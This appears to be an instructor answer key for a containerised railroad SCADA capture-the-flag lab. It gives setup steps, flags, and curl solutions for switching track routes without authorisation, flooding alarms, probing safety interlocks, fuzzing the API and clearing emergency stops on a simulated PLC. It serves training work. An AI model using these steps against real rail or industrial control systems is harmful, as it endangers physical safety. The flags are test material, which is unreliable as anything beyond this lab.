# OT Railroad North Lab: Instructor Guide
## IronTrack Security Assessment -- Solutions and Setup

---

## Setup Instructions

```bash
cd ot-railroad-north
docker-compose up --build -d
```

Verify:
- SCADA Dashboard: http://localhost:8081
- Master PLC API: http://localhost:8085/api/status
- CTF Scoring: http://localhost:5000
- Wireshark: https://localhost:3001

---

## Module Solutions

### Module 1: Network Recon (100 pts, Easy)

**Question:** Identify the IP address of the Master PLC on the OT network.

**Solution:** Open Wireshark, capture traffic, filter for HTTP. Or check the docker-compose.yml.

**Flag:** `172.25.0.10`

---

### Module 2: Protocol Identification (100 pts, Easy)

**Question:** What port does the Master PLC listen on for Modbus TCP?

**Flag:** `502`

**Solution:** Found in docker-compose.yml or by running `nmap` against the Master PLC.

---

### Module 3: API Endpoint Discovery (150 pts, Medium)

**Question:** Query the Master PLC's status API. How many safety interlocks are active?

**Solution:**
```bash
curl http://<MASTER_IP>:8085/api/status | python3 -m json.tool
# Count the safety_interlocks array entries where active=true
```

**Flag:** `4`

---

### Module 4: Unauthorized Track Switch (200 pts, Medium)

**Question:** Switch Segment 1 to ROUTE_C via the API. What is the `requested_route` value in the response?

**Solution:**
```bash
curl -X POST http://<MASTER_IP>:8085/api/command \
  -H "Content-Type: application/json" \
  -d '{"segment_id": 1, "route": "ROUTE_C"}'
```

**Flag:** `ROUTE_C`

---

### Module 5: Alarm Flooding (200 pts, Medium)

**Question:** Send 50 rapid route-switch commands. After the flood, query `/api/status`. What is the `total_commands` count?

**Solution:**
```bash
for i in $(seq 1 50); do
  curl -s -X POST http://<MASTER_IP>:8085/api/command \
    -H "Content-Type: application/json" \
    -d '{"segment_id": 3, "route": "ROUTE_A"}' > /dev/null
done
curl http://<MASTER_IP>:8085/api/status | python3 -c "import json,sys; print(json.load(sys.stdin)['total_commands'])"
```

**Flag:** Any integer >= 50 (dynamic validation)

---

### Module 6: Safety Interlock Bypass (300 pts, Hard)

**Question:** Set Segment 1 to ROUTE_A, then try to set Segment 2 to ROUTE_A. What is the `reason` text in the rejection response?

**Solution:**
```bash
curl -X POST http://<MASTER_IP>:8085/api/command \
  -H "Content-Type: application/json" \
  -d '{"segment_id": 1, "route": "ROUTE_A"}'

curl -X POST http://<MASTER_IP>:8085/api/command \
  -H "Content-Type: application/json" \
  -d '{"segment_id": 2, "route": "ROUTE_A"}'
# Response includes: "reason": "Conflicting routes at junction"
```

**Flag:** `Conflicting routes at junction`

---

### Module 7: API Fuzzing (300 pts, Hard)

**Question:** Send an invalid route (`ROUTE_XYZ`). What is the exact error string?

**Solution:**
```bash
curl -X POST http://<MASTER_IP>:8085/api/command \
  -H "Content-Type: application/json" \
  -d '{"segment_id": 1, "route": "ROUTE_XYZ"}'
```

**Flag:** `Invalid route: ROUTE_XYZ`

---

### Module 8: Packet Capture Analysis (250 pts, Hard)

**Question:** Capture Attack 4 in Wireshark. What JSON key specifies the track segment in the POST body?

**Solution:**
1. Open Wireshark at https://localhost:3001
2. Start capture
3. Run the track switch command
4. Filter: `http.request.method == POST`
5. Follow TCP Stream -> read the JSON body

**Flag:** `segment_id`

---

### Module 9: Emergency Recovery (200 pts, Medium)

**Question:** Clear an emergency stop. What is the `action` field from the `/api/emergency/clear` endpoint?

**Solution:**
```bash
curl -X POST http://<MASTER_IP>:8085/api/emergency/clear
```

**Flag:** `emergency_cleared`

---

### Module 10: Deep Memory Forensics (400 pts, Expert)

**Question:** Find the hidden flag in the Master PLC's memory. The SCADA Dashboard does NOT display this field.

**Solution:**
```bash
curl http://<MASTER_IP>:8085/api/status | python3 -m json.tool
# Look at the "firmware_notes" field:
# "firmware_notes": "DEBUG_FLAG: FLAG{modbus_master_pwned}"
```

**Flag:** `FLAG{modbus_master_pwned}`

---

## Grading Rubric

| Module | Points |
|--------|--------|
| Module 1: Network Recon | 100 |
| Module 2: Protocol ID | 100 |
| Module 3: API Discovery | 150 |
| Module 4: Track Switch | 200 |
| Module 5: Alarm Flooding | 200 |
| Module 6: Safety Interlock | 300 |
| Module 7: API Fuzzing | 300 |
| Module 8: Packet Capture | 250 |
| Module 9: Emergency Recovery | 200 |
| Module 10: Memory Forensics | 400 |
| **Total** | **2,200** |

---

## Common Student Issues

| Problem | Solution |
|---------|----------|
| "curl not found" | Rebuild student container: `docker-compose build student-env` |
| SCADA dashboard not loading | `docker restart lab-ot-rail-scada` |
| All signals RED (E-STOP) | `docker restart lab-ot-rail-master-plc`, wait 10s, then Clear Faults on dashboard |
| Wireshark not loading | Must use `https://`, click through SSL warning |
| Multiple students attacking | Expected. All commands appear in the shared audit log |
